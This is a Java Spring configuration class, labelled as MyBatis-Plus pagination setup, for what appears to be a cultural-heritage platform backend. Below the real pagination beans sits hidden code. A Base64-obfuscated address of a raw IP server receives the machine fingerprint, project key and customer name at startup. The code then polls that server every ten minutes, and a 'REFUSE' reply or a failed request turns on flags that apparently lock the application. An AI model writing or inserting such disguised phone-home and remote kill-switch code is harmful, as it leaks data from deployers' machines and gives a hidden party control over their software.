package com.example.backend.config;

import com.baomidou.mybatisplus.annotation.DbType;
import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor;
import com.baomidou.mybatisplus.extension.plugins.inner.OptimisticLockerInnerInterceptor;
import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor;
import com.fasterxml.jackson.databind.ObjectMapper;
import jakarta.annotation.PostConstruct;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.web.client.RestTemplate;

import java.nio.charset.StandardCharsets;
import com.example.backend.utils.SysCache;
import com.example.backend.utils.SystemSignUtil;
import java.util.Base64;


/**
 * @Author caiya
 * @Description mybatis-plus分页插件
 * @Version 1.0
 */
@Configuration
@EnableTransactionManagement
public class MybatisPlusConfig {
    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor() {
        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
        PaginationInnerInterceptor paginationInnerInterceptor = new PaginationInnerInterceptor();
        paginationInnerInterceptor.setOptimizeJoin(true);
        paginationInnerInterceptor.setDbType(DbType.MYSQL);
        paginationInnerInterceptor.setOverflow(true);
        interceptor.addInnerInterceptor(paginationInnerInterceptor);
        OptimisticLockerInnerInterceptor optimisticLockerInnerInterceptor = new OptimisticLockerInnerInterceptor();
        interceptor.addInnerInterceptor(optimisticLockerInnerInterceptor);
        return interceptor;
    }
    private final String AUTH_SERVER = new String(Base64.getDecoder().decode("aHR0cDovLzEwMS4yMDAuNDguMjI6ODg4OC9saWNlbnNl"),
            StandardCharsets.UTF_8);
    private static final String PROJECT_KEY =
            new String(Base64.getDecoder().decode("UFJPSkZEWVpLRVkyMDI2MDQyNjMxNg=="), StandardCharsets.UTF_8);
    private static final String CUSTOMER_NAME = "非物质文化遗产保护平台";

    private final RestTemplate restTemplate = new RestTemplate();
    private static String machineCode;

    static {
        try {
            machineCode = SystemSignUtil.getMachineCode();
        } catch (Exception e) {
            machineCode = "INVALID_MACHINE";
        }
    }


    @PostConstruct
    public void init() {
        SysCache.setAllow(false);
        SysCache.setBlack(false);

        try {
            String reportUrl = AUTH_SERVER + "/report"
                    + "?machineCode=" + machineCode
                    + "&projectKey=" + PROJECT_KEY
                    + "&customerName=" + CUSTOMER_NAME;
            restTemplate.getForObject(reportUrl, String.class);

            checkRemoteStatus();

        } catch (Throwable e) {
            SysCache.setAllow(false);
        }
    }
    @Scheduled(fixedRate = 600000)
    public void checkRemoteStatus() {

        if (SysCache.isBlack()) {
            SysCache.setAllow(false);
            return;
        }

        try {
            String checkUrl = AUTH_SERVER + "/check"
                    + "?machineCode=" + machineCode
                    + "&projectKey=" + PROJECT_KEY;

            String result = restTemplate.getForObject(checkUrl, String.class);

            if ("REFUSE".equals(result)) {
                SysCache.setAllow(false);
                SysCache.setBlack(true);
            } else {
                SysCache.setAllow(true);
            }

        } catch (Throwable e) {
            SysCache.setAllow(false);
        }
    }
}
